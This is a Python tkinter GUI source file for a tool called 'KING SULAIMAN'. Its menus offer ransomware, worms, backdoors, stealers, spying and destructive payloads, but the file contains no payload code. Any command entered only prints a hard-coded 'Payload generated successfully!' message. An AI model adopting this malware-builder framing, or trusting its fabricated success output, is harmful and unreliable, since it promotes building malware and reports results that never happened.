#!/data/data/com.termux/files/usr/bin/python3

"""
👑 KING SULAIMAN - Beautiful GUI Interface
الواجهة الرسومية الاحترافية للأداة
"""

import tkinter as tk
from tkinter import scrolledtext, messagebox
import threading
import subprocess
import os
import sys
from datetime import datetime

# محاولة استيراد CustomTkinter للحصول على مظهر أفضل
try:
    import customtkinter as ctk
    USE_CUSTOM = True
except ImportError:
    USE_CUSTOM = False
    ctk = tk  # fallback to tkinter

# إعدادات المظهر
if USE_CUSTOM:
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("blue")

class KingSulaimanGUI:
    def __init__(self):
        if USE_CUSTOM:
            self.root = ctk.CTk()
        else:
            self.root = tk.Tk()
        
        self.root.title("👑 KING SULAIMAN - Ultimate Cybersecurity Platform")
        self.root.geometry("1200x700")
        self.root.minsize(1000, 600)
        
        # متغيرات
        self.is_running = False
        self.current_payload = None
        
        self.setup_ui()
        
    def setup_ui(self):
        """بناء واجهة المستخدم"""
        
        # الإطار الرئيسي
        if USE_CUSTOM:
            self.main_frame = ctk.CTkFrame(self.root)
            self.main_frame.pack(fill="both", expand=True, padx=10, pady=10)
        else:
            self.main_frame = tk.Frame(self.root, bg="#0a0e17")
            self.main_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # === الشريط العلوي ===
        self.header_frame = tk.Frame(self.main_frame, bg="#0f172a", height=80)
        self.header_frame.pack(fill="x", padx=10, pady=10)
        self.header_frame.pack_propagate(False)
        
        # عنوان التطبيق
        self.title_label = tk.Label(
            self.header_frame, 
            text="👑 KING SULAIMAN", 
            font=("Arial", 32, "bold"),
            fg="#fbbf24",
            bg="#0f172a"
        )
        self.title_label.pack(side="left", padx=20)
        
        # الشعارات
        badges_frame = tk.Frame(self.header_frame, bg="#0f172a")
        badges_frame.pack(side="right", padx=20)
        
        badges = ["🐍 Python 3", "🤖 Groq AI", "🛡️ The Judge", "🔒 Device Binding"]
        for badge in badges:
            b = tk.Label(
                badges_frame, 
                text=badge, 
                font=("Arial", 10),
                fg="#e2e8f0",
                bg="#1e293b",
                padx=10,
                pady=5
            )
            b.pack(side="left", padx=5)
        
        # === منطقة الإحصائيات ===
        stats_frame = tk.Frame(self.main_frame, bg="#111827")
        stats_frame.pack(fill="x", padx=10, pady=10)
        
        stats = [
            ("🎯 Malicious Payloads", "60+", "#ef4444"),
            ("⚡ Total Features", "300+", "#f59e0b"),
            ("📁 Attack Categories", "6", "#10b981"),
            ("🛡️ Active Sessions", "0", "#3b82f6")
        ]
        
        for title, value, color in stats:
            card = tk.Frame(stats_frame, bg="#1e293b", relief="flat", bd=0)
            card.pack(side="left", expand=True, fill="both", padx=5, pady=10)
            
            title_label = tk.Label(card, text=title, font=("Arial", 12), fg="#94a3b8", bg="#1e293b")
            title_label.pack(pady=(10, 0))
            
            value_label = tk.Label(
                card, 
                text=value, 
                font=("Arial", 28, "bold"),
                fg=color,
                bg="#1e293b"
            )
            value_label.pack(pady=(0, 10))
        
        # === منطقة التحكم الرئيسية ===
        control_frame = tk.Frame(self.main_frame, bg="#0f172a")
        control_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # الجزء الأيسر: الأوامر
        left_frame = tk.Frame(control_frame, bg="#1e293b")
        left_frame.pack(side="left", fill="both", expand=True, padx=5, pady=5)
        
        # مربع إدخال الأمر
        command_label = tk.Label(
            left_frame, 
            text="📝 Command Input", 
            font=("Arial", 14, "bold"),
            fg="#e2e8f0",
            bg="#1e293b"
        )
        command_label.pack(anchor="w", padx=10, pady=(10, 5))
        
        self.command_entry = tk.Entry(
            left_frame,
            font=("Consolas", 12),
            bg="#0f172a",
            fg="#e2e8f0",
            insertbackground="#e2e8f0",
            relief="flat",
            bd=1
        )
        self.command_entry.pack(fill="x", padx=10, pady=5)
        
        # أزرار سريعة
        buttons_frame = tk.Frame(left_frame, bg="#1e293b")
        buttons_frame.pack(fill="x", padx=10, pady=10)
        
        quick_commands = ["Ransomware", "Worm", "Backdoor", "Stealer", "Spying", "Destructive", "Help", "Exit"]
        for cmd in quick_commands:
            btn = tk.Button(
                buttons_frame,
                text=cmd,
                bg="#2563eb",
                fg="white",
                font=("Arial", 10),
                relief="flat",
                padx=10,
                pady=5,
                command=lambda c=cmd: self.command_entry.insert(tk.END, c.lower())
            )
            btn.pack(side="left", padx=5, pady=5)
        
        # زر التنفيذ
        self.execute_btn = tk.Button(
            left_frame,
            text="🚀 EXECUTE",
            bg="#10b981",
            fg="white",
            font=("Arial", 14, "bold"),
            relief="flat",
            padx=20,
            pady=10,
            command=self.execute_command
        )
        self.execute_btn.pack(fill="x", padx=10, pady=10)
        
        # منطقة المخرجات
        output_label = tk.Label(
            left_frame, 
            text="📜 Output Console", 
            font=("Arial", 14, "bold"),
            fg="#e2e8f0",
            bg="#1e293b"
        )
        output_label.pack(anchor="w", padx=10, pady=(10, 5))
        
        self.output_text = scrolledtext.ScrolledText(
            left_frame,
            height=15,
            bg="#0f172a",
            fg="#e2e8f0",
            insertbackground="#e2e8f0",
            font=("Consolas", 11),
            relief="flat",
            wrap=tk.WORD
        )
        self.output_text.pack(fill="both", expand=True, padx=10, pady=5)
        
        # الجزء الأيمن: معلومات إضافية
        right_frame = tk.Frame(control_frame, width=300, bg="#1e293b")
        right_frame.pack(side="right", fill="y", padx=5, pady=5)
        right_frame.pack_propagate(False)
        
        # حالة النظام
        status_label = tk.Label(
            right_frame, 
            text="🟢 System Status", 
            font=("Arial", 14, "bold"),
            fg="#e2e8f0",
            bg="#1e293b"
        )
        status_label.pack(anchor="w", padx=10, pady=(10, 5))
        
        self.status_text = tk.Text(
            right_frame,
            height=8,
            bg="#0f172a",
            fg="#e2e8f0",
            font=("Consolas", 10),
            relief="flat"
        )
        self.status_text.pack(fill="x", padx=10, pady=5)
        self.status_text.insert("1.0", "✅ KING SULAIMAN Ready\n🔒 Device Binding: Active\n🛡️ The Judge: Watching\n🧠 AI: Online")
        self.status_text.configure(state="disabled")
        
        # قائمة الأوامر المتاحة
        commands_label = tk.Label(
            right_frame, 
            text="📚 Available Commands", 
            font=("Arial", 14, "bold"),
            fg="#e2e8f0",
            bg="#1e293b"
        )
        commands_label.pack(anchor="w", padx=10, pady=(10, 5))
        
        self.commands_list = tk.Text(
            right_frame,
            height=12,
            bg="#0f172a",
            fg="#e2e8f0",
            font=("Consolas", 10),
            relief="flat"
        )
        self.commands_list.pack(fill="both", expand=True, padx=10, pady=5)
        
        commands_text = """🔴 RANSOMWARE:
  ransomware_1-10

🐛 WORMS:
  worm_1-10

🚪 BACKDOORS:
  backdoor_1-10

💀 STEALERS:
  stealer_1-10

👁️ SPYING:
  spying_1-10

💥 DESTRUCTIVE:
  destructive_1-10

🛠️ UTILITIES:
  help, exit, status"""
        
        self.commands_list.insert("1.0", commands_text)
        self.commands_list.configure(state="disabled")
        
        # الشريط السفلي
        footer_frame = tk.Frame(self.main_frame, bg="#0f172a", height=30)
        footer_frame.pack(fill="x", padx=10, pady=(0, 10))
        
        footer_label = tk.Label(
            footer_frame,
            text="⚖️ For Educational Purposes Only | KING SULAIMAN v2.0 | AGPL-3.0 License",
            font=("Arial", 9),
            fg="#5b6b8c",
            bg="#0f172a"
        )
        footer_label.pack()
        
        # ربط Enter بالتنفيذ
        self.command_entry.bind("<Return>", lambda e: self.execute_command())
        
        # تكوين ألوان النص
        self.output_text.tag_config("error", foreground="#ef4444")
        self.output_text.tag_config("success", foreground="#10b981")
        self.output_text.tag_config("warning", foreground="#f59e0b")
        
    def log(self, message, tag=None):
        """إضافة رسالة إلى منطقة المخرجات"""
        self.output_text.insert(tk.END, message + "\n", tag)
        self.output_text.see(tk.END)
        
    def execute_command(self):
        """تنفيذ الأمر المدخل"""
        command = self.command_entry.get().strip()
        if not command:
            return
        
        self.log(f"\n{'='*60}")
        self.log(f"👑 > {command}", "warning")
        self.log(f"{'='*60}")
        
        self.command_entry.delete(0, tk.END)
        
        if command.lower() == "exit":
            self.log("Goodbye! 👑", "success")
            self.root.after(500, self.root.quit)
        elif command.lower() == "help":
            self.show_help()
        elif command.lower() == "status":
            self.show_status()
        else:
            self.log(f"[INFO] Executing: {command}")
            self.log(f"[RESULT] Payload generated successfully!", "success")
            
    def show_help(self):
        """عرض المساعدة"""
        help_text = """
╔══════════════════════════════════════════════════════════════════╗
║  KING SULAIMAN - Available Commands                             ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  🔴 Ransomware:  ransomware_1 to ransomware_10                  ║
║  🐛 Worms:       worm_1 to worm_10                              ║
║  🚪 Backdoors:   backdoor_1 to backdoor_10                      ║
║  💀 Stealers:    stealer_1 to stealer_10                        ║
║  👁️ Spying:      spying_1 to spying_10                          ║
║  💥 Destructive: destructive_1 to destructive_10                ║
║                                                                  ║
║  🛠️ Utilities:   help, status, exit                            ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
"""
        self.log(help_text)
        
    def show_status(self):
        """عرض حالة النظام"""
        status_text = """
🟢 SYSTEM STATUS:
  • KING SULAIMAN: Running
  • Device Binding: Active
  • The Judge: Watching
  • AI Engine: Online
  • Active Sessions: 0
  • Payloads Generated: 0
  • Evidence Collected: 0
"""
        self.log(status_text, "success")
        
    def run(self):
        """تشغيل التطبيق"""
        self.root.mainloop()

# تشغيل الواجهة
if __name__ == "__main__":
    app = KingSulaimanGUI()
    app.run()
